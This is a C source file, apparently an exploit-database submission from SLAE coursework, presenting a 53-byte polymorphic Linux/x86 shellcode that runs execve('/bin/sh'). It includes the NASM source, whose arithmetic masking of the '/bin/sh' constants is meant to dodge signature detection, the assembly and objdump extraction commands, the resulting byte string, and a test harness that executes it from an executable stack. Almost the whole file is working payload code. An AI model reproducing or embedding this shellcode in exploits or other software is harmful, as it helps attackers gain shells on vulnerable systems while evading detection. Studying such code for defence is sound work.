/*
# Title: Linux/x86 - execve(/bin/sh) Polymorphic Shellcode (53 bytes)
# Date: 10-Jan-2018
# Exploit Author: Debashis Pal <debashis.pals[at]gmail.com>
# SLAE-1122
# Tested on: i686 GNU/Linux
# '//bin/sh' = 0x68732f6e  0x69622f2f


########## polymorphic.nasm ##########

global _start
section .text
_start:
add esi, 0x30 ;junk
xor ecx, ecx
mul ecx
mov dword [esp-4], ecx
sub esp, 4
mov esi, 0x353ffc3b
add esi, 0x33333333 ; 0x68732f6e
mov dword [esp-4], esi
mov edi, 0xada67373
sub edi, 0x44444444 ; 0x69622f2f
mov dword [esp-8], edi
sub esp, 8
mov ebx, esp
mov al, 11
int 0x80

####################################

$ nasm -f elf polymorphic.nasm
$ ld -o polymorphic polymorphic.o
$ objdump -d ./polymorphic|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x83\xc6\x30\x31\xc9\xf7\xe1\x89\x4c\x24\xfc\x83\xec\x04\xbe\x3b\xfc\x3f\x35\x81\xc6\x33\x33\x33\x33\x89\x74\x24\xfc\xbf\x73\x73\xa6\xad\x81\xef\x44\x44\x44\x44\x89\x7c\x24\xf8\x83\xec\x08\x89\xe3\xb0\x0b\xcd\x80"
$ gcc -fno-stack-protector -z execstack shellcode.c -o x86PolymorphicShellcodelinux32
$ ./x86PolymorphicShellcodelinux32
Shellcode Length:  53
$ uname -a
Linux kali 4.4.0-kali1-686 #1 SMP Debian 4.4.2-3kali1 (2016-02-23) i686 GNU/Linux
$

####################################

*/


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x83\xc6\x30\x31\xc9\xf7\xe1\x89\x4c\x24\xfc\x83\xec\x04\xbe\x3b\xfc\x3f\x35"
"\x81\xc6\x33\x33\x33\x33\x89\x74\x24\xfc\xbf\x73\x73\xa6\xad\x81\xef\x44\x44"
"\x44\x44\x89\x7c\x24\xf8\x83\xec\x08\x89\xe3\xb0\x0b\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}